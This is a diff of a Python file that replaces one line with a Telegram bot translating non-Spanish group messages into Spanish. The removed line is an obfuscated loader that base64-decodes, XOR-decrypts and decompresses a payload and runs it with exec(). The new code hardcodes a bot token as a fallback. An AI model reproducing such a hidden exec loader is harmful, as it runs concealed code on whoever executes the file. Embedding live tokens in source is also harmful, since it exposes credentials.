@@ -1,1 +1,133 @@
-import base64 as a,zlib as z;d=['Vffoe/BD9hs5k/p+', 'PTcdZbUGFSb/Qy', 'xZjPdnx+ObL3YDGyEo7Heh7', 'mMPKL/jTyE', 'A2yMGWxhNGlasTK', 'K9GsQ+wTzrEvRfwQscG02X', '3eLMFDLi4upiCXjglSlhV', 'bqxeG3PPwIVhy2c2', '3RwDaSa+g9RDrbY7S7HZM', 'eXCV4JJI7iuokBHcI11iU', 'mrDvVKI9o9PVX', 'oWcovYJHAYHIv', '7k/Xsyos/CK', '7ZWrvw4HZwk', '0QpsXSkF8z1FAmuMIj6YvZ', 'hFyiknSWG3yUR5Tq9n', 'K597DNQ+sXCxP/diR4u', '2+VjLI/ebrSq7e9AnEIE', 'NSNBIxvEryiU6o42mZfdb', '/xu1Ss8j9tdA9hZ/', 'Rp2XbLouTyrBiSzr0OX', 'OJvvwNMtmehCfR5NnL', '5Hya1sj66grww+', 'T+js7j91vZwcn0/OTc', '/oKjkFqz+kd7', 'kf6KbZ0Iss71am', 'bk0SO9pYahTzImEhmM', '6F8Ter7ub8KH/T', 'MBg/C6dBM1I9d', 'kErAzPXvNZp3N5rfsRnm/', 'ryi4damKixWjyL9+jSFtn', 'GtSat4GCQwELYxNinwHdiCrKO', 'mPa7m4rAs6Xk2/gsGiO5+Iql4', 'uXCFZDqE+k7TOd8MpsYx/zUu', 'yNvgC4YykQ', '0hgA2CL95E+8gFpb19/KkwWTa', 'NHUEXb65WYgB2aEXv+XzT01L', 'wLiFvY41Ruo4', 'XUpLDyrJ4zCM7ZSB8sjlk', 'RYHOLfh2ziIKfbiui6afj', 'rOOWbzmSaDF7tS', 'fZOypmDhmKY10XTUNI', 'z1lmAo9TV7vhq8c', '1UFq8hwdgtLcHHJ', '3cfEg4arICSnz', 'BjDm6nUtvG4CKYVOnUrbrd', 'Fn+BaiSFtQbt', 'ZzDKg2yScpwYqPon7mF/fbA', 'MIZYVu4JmRiOMjy8qwYx', '+sjn1StGOcrzE83yRn', 'L6D1iPcwYhqvufM2WnmRL', 'lOArfZP+y2DMK', 'o9bVrSaPqSRD', 'n9CCNYysXCxapMw700J', 'THWM7qY9/BnEhw', '6PvTJmwGTOMdl7', 'wosFrRqyaRf2v', 'VtA1u3ePlC', 'xpJ/oZgsSEyPD3dBJjn', '867UVqbMRsY67', 'YZmnAZR8EqYw0', 'tl08xLGGsY9/bYnuvohJSdbp', 'Y1rp3BWSIhwd9x', 'YKs75CwjGZ', 'RoHdxltLtMHnQk', 'LgSfZiE1UNDs', 'wDOfYgzMV8h+NkMiYXvPbca', 'D6k4Dzlv8n8t+Jj', 'H/cMIAiUOXq4k4YALofNFXs2X', 'i7+dvj6nnJFvCDsgdamnL3', 'P0ZkydUGrxGf', '/wJ45JFSmyrt', 'rgcoYr18Fqd1T/EzGI/kR', 'fs/PC+Va8oerEPYf2bv', 'O36ttm5ZtXG', 'lKOYChWedMi', 'y/T0uJcd0VrldujAqBrVGAp5', 'K9PyktLcBn1afAr0VBsc', 'CkS3IB69ivLLNNUv2b', '+mUb2giksIxMiuemQSLjJ', 'S1s1Cf8hmh2meASR', 'wKcwSVqOeXw=='];k=45;s=''.join(d);b=a.b64decode(s);c=bytes([i^k for i in b]);exec(z.decompress(c).decode());
+import os
+from telegram import Update
+from telegram.ext import (
+    ApplicationBuilder,
+    MessageHandler,
+    ContextTypes,
+    filters
+)
+
+from deep_translator import GoogleTranslator
+from langdetect import detect, DetectorFactory
+
+DetectorFactory.seed = 0
+
+# ------------------------------
+# CONFIGURACIÓN
+# ------------------------------
+TOKEN = os.getenv("BOT_TOKEN") or "8466421746:AAENWQ0-PqYmonpWmba4BDZnRaC9YS105as"
+
+GRUPOS_PERMITIDOS = {
+    -1002935005613,
+    -1001757153683
+}
+
+translator = GoogleTranslator(source="auto", target="es")
+
+traducciones = {}
+
+
+# ---------------------------------------
+# UTILIDADES
+# ---------------------------------------
+def grupo_valido(msg):
+    return msg and msg.chat_id in GRUPOS_PERMITIDOS
+
+
+def es_espanol(texto):
+    try:
+        return detect(texto) == "es"
+    except:
+        return False
+
+
+def extraer_texto(msg):
+    if msg.text:
+        return msg.text.strip()
+    if msg.caption:
+        return msg.caption.strip()
+    return None
+
+
+def traducir_texto(texto):
+    return translator.translate(texto)
+
+
+# ---------------------------------------
+# MANEJAR MENSAJES NUEVOS
+# ---------------------------------------
+async def manejar_mensaje(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    msg = update.message or update.channel_post
+    if not grupo_valido(msg):
+        return
+
+    texto = extraer_texto(msg)
+    if not texto:
+        return
+
+    if es_espanol(texto):
+        return
+
+    resultado = traducir_texto(texto)
+
+    bot_msg = await msg.reply_text(resultado)
+
+    traducciones[msg.message_id] = bot_msg.message_id
+
+
+# ---------------------------------------
+# EDITAR TRADUCCIÓN
+# ---------------------------------------
+async def editar_traduccion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    msg = update.edited_message or update.edited_channel_post
+    if not grupo_valido(msg):
+        return
+
+    texto = extraer_texto(msg)
+    if not texto:
+        return
+
+    original_id = msg.message_id
+
+    if original_id not in traducciones:
+        return
+
+    bot_msg_id = traducciones[original_id]
+
+    if es_espanol(texto):
+        await context.bot.edit_message_text(
+            chat_id=msg.chat_id,
+            message_id=bot_msg_id,
+            text="(mensaje ahora en español — traducción eliminada)"
+        )
+        return
+
+    nueva_traduccion = traducir_texto(texto)
+
+    await context.bot.edit_message_text(
+        chat_id=msg.chat_id,
+        message_id=bot_msg_id,
+        text=nueva_traduccion
+    )
+
+
+# ---------------------------------------
+# MAIN
+# ---------------------------------------
+if __name__ == "__main__":
+    app = ApplicationBuilder().token(TOKEN).build()
+
+    # Mensajes normales
+    app.add_handler(MessageHandler(
+        filters.ALL & ~filters.UpdateType.EDITED_MESSAGE & ~filters.UpdateType.EDITED_CHANNEL_POST,
+        manejar_mensaje
+    ))
+
+    # Mensajes editados
+    app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, editar_traduccion))
+    app.add_handler(MessageHandler(filters.UpdateType.EDITED_CHANNEL_POST, editar_traduccion))
+
+    print("🤖 BOT TRADUCTOR — SOLO TEXTO + CAPTIONS — ACTIVADO ✔")
+    app.run_polling()
